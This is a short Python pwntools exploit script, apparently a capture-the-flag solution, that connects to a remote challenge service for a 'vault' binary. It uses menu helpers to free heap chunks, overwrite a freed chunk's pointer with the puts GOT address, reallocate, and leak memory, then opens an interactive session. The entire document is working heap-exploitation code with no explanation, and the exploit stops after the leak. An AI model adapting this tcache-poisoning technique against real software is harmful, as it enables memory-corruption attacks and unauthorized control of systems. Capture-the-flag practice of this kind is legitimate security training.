#!/usr/bin/env python3
from pwn import *
exe = ELF('vault', checksec = False)

# p = process(exe.path)
p = remote('play.scriptsorcerers.xyz', 10142)

def create(idx):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b': ', idx)

def change(idx, data):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b': ', idx)
    p.sendafter(b'? ', data)

def show(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b': ', idx)

def free(idx):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b': ', idx)

input()
p.recvuntil(b': ')
flag_xor = int(p.recvline()[:-1], 16)
log.info("flag xor: " + hex(flag_xor))
create(b'0')
create(b'1')
free(b'1')
free(b'0')
change(b'0', p64(exe.got.puts))
create(b'0')
create(b'1')
show(b'0')
p.recvuntil(b'ur stuff: ')
Input = u64(p.recvline()[:-1])
log.info("Input: " + hex(Input))
log.info("puts got: " + hex(exe.got.puts))


p.interactive()